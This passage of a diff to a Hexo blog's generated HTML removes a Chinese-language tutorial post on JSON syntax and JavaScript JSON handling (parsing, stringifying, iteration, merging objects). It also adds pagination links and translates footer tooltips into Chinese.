-<li><a href="http://www.cnblogs.com/qinfengxiaoyue/p/3450194.html" target="_blank" rel="external">http://www.cnblogs.com/qinfengxiaoyue/p/3450194.html</a></li>
-</ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-json" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2014/05/09/json/" class="article-date">
-      <time datetime="2014-05-09T01:33:36.000Z" itemprop="datePublished">2014-05-09</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2014/05/09/json/">JSON及JS对JSON的操作</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>JSON: <strong>JavaScript Object Notation</strong>(JavaScript 对象表示法)</p>
-<p>JSON 是存储和交换文本信息的语法。类似 XML。</p>
-<p>JSON 比 XML 更小、更快，更易解析。</p>
-<h2 id="一、什么是-JSON-？"><a href="#一、什么是-JSON-？" class="headerlink" title="一、什么是 JSON ？"></a>一、什么是 JSON ？</h2><ul>
-<li>JSON 指的是 JavaScript 对象表示法（JavaScript Object Notation）</li>
-<li>JSON 是轻量级的文本数据交换格式</li>
-<li>JSON 独立于语言 *</li>
-<li>JSON 具有自我描述性，更易理解</li>
-</ul>
-<blockquote>
-<p>*JSON 使用 Javascript语法来描述数据对象，但是 JSON 仍然独立于语言和平台。JSON 解析器和 JSON 库支持许多不同的编程语言。 目前非常多的动态（PHP，JSP，.NET）编程语言都支持JSON。</p>
-</blockquote>
-<h3 id="1-1综合概述："><a href="#1-1综合概述：" class="headerlink" title="1.1综合概述："></a>1.1综合概述：</h3><p>JSON是一种轻量级的数据交换格式，采用完全独立于语言的文本格式，是理想的数据交换格式。同时，JSON是 JavaScript 原生格式，这意味着在 JavaScript 中处理 JSON数据不须要任何特殊的 API 或工具包。</p>
-<h2 id="二、在JSON中，有两种结构：对象和数组。"><a href="#二、在JSON中，有两种结构：对象和数组。" class="headerlink" title="二、在JSON中，有两种结构：对象和数组。"></a>二、在JSON中，有两种结构：对象和数组。</h2><ul>
-<li>1.对象</li>
-</ul>
-<p>一个对象以“{”开始，“}”结束。每个“key”后跟一“:”，“‘key/value’ 对”之间运用 “,”分隔。</p>
-<pre><code>packJson = {&quot;name&quot;:&quot;nikita&quot;, &quot;password&quot;:&quot;1111&quot;}
-</code></pre><p>2.数组</p>
-<pre><code>packJson = [
-    {&quot;name&quot;:&quot;nikita&quot;, &quot;password&quot;:&quot;1111&quot;}, 
-    {&quot;name&quot;:&quot;tony&quot;, &quot;password&quot;:&quot;2222&quot;}
-];
-</code></pre><p>数组是值的有序集合。一个数组以“[”开始，“]”结束。值之间运用 “,”分隔。</p>
-<h2 id="三、JSON对象和JSON字符串的转换"><a href="#三、JSON对象和JSON字符串的转换" class="headerlink" title="三、JSON对象和JSON字符串的转换"></a>三、JSON对象和JSON字符串的转换</h2><p>在数据传输流程中，json是以文本，即字符串的形式传递的，而JS操作的是JSON对象，所以，JSON对象和JSON字符串之间的相互转换是关键。例如：</p>
-<p>JSON字符串：</p>
-<pre><code>var jsonStr = &apos;{&quot;name&quot;:&quot;nikita&quot;, &quot;password&quot;:&quot;1111&quot;}&apos;;
-</code></pre><p>JSON对象：</p>
-<pre><code>var jsonObj = {&quot;name&quot;:&quot;nikita&quot;, &quot;password&quot;:&quot;1111&quot;};
-</code></pre><h4 id="3-1-jQuery插件支持的转换方式："><a href="#3-1-jQuery插件支持的转换方式：" class="headerlink" title="3.1  jQuery插件支持的转换方式："></a>3.1  jQuery插件支持的转换方式：</h4><pre><code>$.parseJSON( jsonstr ); //jQuery.parseJSON(jsonstr),可以将json字符串转换成json对象
-</code></pre><h4 id="3-2-浏览器支持的转换方式"><a href="#3-2-浏览器支持的转换方式" class="headerlink" title="3.2 浏览器支持的转换方式:"></a>3.2 浏览器支持的转换方式:</h4><pre><code>JSON.parse(jsonstr); //可以将json字符串转换成json对象 
-JSON.stringify(jsonobj); //可以将json对象转换成json对符串 
-</code></pre><h4 id="3-3-Javascript支持的转换方式："><a href="#3-3-Javascript支持的转换方式：" class="headerlink" title="3.3 Javascript支持的转换方式："></a>3.3 Javascript支持的转换方式：</h4><pre><code>eval(&apos;(&apos; + jsonstr + &apos;)&apos;); //可以将json字符串转换成json对象,注意需要在json字符外包裹一对小括号 
-</code></pre><blockquote>
-<p>注：ie8(兼容模式),ie7和ie6也可以使用eval()将字符串转为JSON对象，但不推荐这些方式，这种方式不安全eval会执行json串中的表达式。 </p>
-</blockquote>
-<p><strong>注意：</strong></p>
-<blockquote>
-<p>上面的几个方法中，除了eval()函数是js自带的之外，其他的几个方法都来自json.js包。新版本的 JSON 修改了 API，将 JSON.stringify() 和 JSON.parse() 两个方法都注入到了 Javascript 的内建对象里面，前者变成了 Object.toJSONString()，而后者变成了 String.parseJSON()。如果提示找不到toJSONString()和parseJSON()方法，则说明您的json包版本太低。</p>
-</blockquote>
-<h2 id="四、遍历JSON对象"><a href="#四、遍历JSON对象" class="headerlink" title="四、遍历JSON对象"></a>四、遍历JSON对象</h2><pre><code>myJson = {&quot;name&quot;:&quot;nikita&quot;, &quot;password&quot;:&quot;1111&quot;};
-
-for(var p in myJson){//遍历json对象的每个key/value对,p为key
-
-   alert(p + &quot; &quot; + myJson[p]);
-
-}
-</code></pre><h4 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h4><p><img src="json/09102711-9f7ee96ccc6d433dbd0d0a11984edada.jpg" alt=""></p>
-<h2 id="五、遍历JSON数组"><a href="#五、遍历JSON数组" class="headerlink" title="五、遍历JSON数组"></a>五、遍历JSON数组</h2><pre><code>packJson = [
-    {&quot;name&quot;:&quot;nikita&quot;, &quot;password&quot;:&quot;1111&quot;},    
-    {&quot;name&quot;:&quot;tony&quot;, &quot;password&quot;:&quot;2222&quot;}    
-    ];        
-    for(var p in packJson){//遍历json数组时，这么写p为索引，0,1    
-       alert(packJson[p].name + &quot; &quot; + packJson[p].password);
-}
-</code></pre><p>也可以这么遍历：<br>    for(var i = 0; i &lt; packJson.length; i++){</p>
-<pre><code>   alert(packJson[i].name + &quot; &quot; + packJson[i].password);
-
-}
-</code></pre><h4 id="运行结果：-1"><a href="#运行结果：-1" class="headerlink" title="运行结果："></a>运行结果：</h4><p><img src="json/09102758-01fd3c99174a4c14945ee3f6803a7fb4.jpg" alt=""></p>
-<h2 id="六、将两个JSON对象组装到一个里面"><a href="#六、将两个JSON对象组装到一个里面" class="headerlink" title="六、将两个JSON对象组装到一个里面"></a>六、将两个JSON对象组装到一个里面</h2><ul>
-<li>方法：</li>
-</ul>
-<pre><code>var mergeJsonObject = function (jsonbject1, jsonbject2) {
-var resultJsonObject={};
-    for(var attr in jsonbject1){
-        resultJsonObject[attr]=jsonbject1[attr];
-    }
-    for(var attr in jsonbject2){
-        resultJsonObject[attr]=jsonbject2[attr];
-    }
-    return resultJsonObject;
-};
-</code></pre><p>举个栗子：</p>
-<pre><code>var json1 = {&quot;name&quot;:&quot;nikita&quot;};
-var json2 = {&quot;password&quot;:&quot;1111&quot;};
-mergeJsonObject(json1, json2);
-</code></pre><p>本文引用文章地址：</p>
-<p>1.<a href="http://www.cnblogs.com/csj222/archive/2013/04/11/3013667.html" title="http://www.cnblogs.com/csj222/archive/2013/04/11/3013667.html" target="_blank" rel="external">http://www.cnblogs.com/csj222/archive/2013/04/11/3013667.html</a><br>2.<a href="http://www.jb51.net/article/35090.htm" title="http://www.jb51.net/article/35090.htm" target="_blank" rel="external">http://www.jb51.net/article/35090.htm</a><br>3.<a href="http://blog.csdn.net/wangshu696/article/details/50969281" title="http://blog.csdn.net/wangshu696/article/details/50969281" target="_blank" rel="external">http://blog.csdn.net/wangshu696/article/details/50969281</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    </nav>
   
 </div>
       <footer id="footer">
@@ -863,14 +1028,14 @@ mergeJsonObject(json1, json2);
                 2016-2017 qiyian
             </div>
             <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
             </div>
         </div>
         
             <div class="visit">
                 
                     <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                         </span>
                     </span>
                 
@@ -879,7 +1044,7 @@ mergeJsonObject(json1, json2);
                 
                 
                     <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                         </span>
                     </span>
                 
@@ -912,9 +1077,9 @@ mergeJsonObject(json1, json2);
 
 
 <div class="scroll" id="scroll">
-    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
 </div>
 <script>
     // Open in New Window
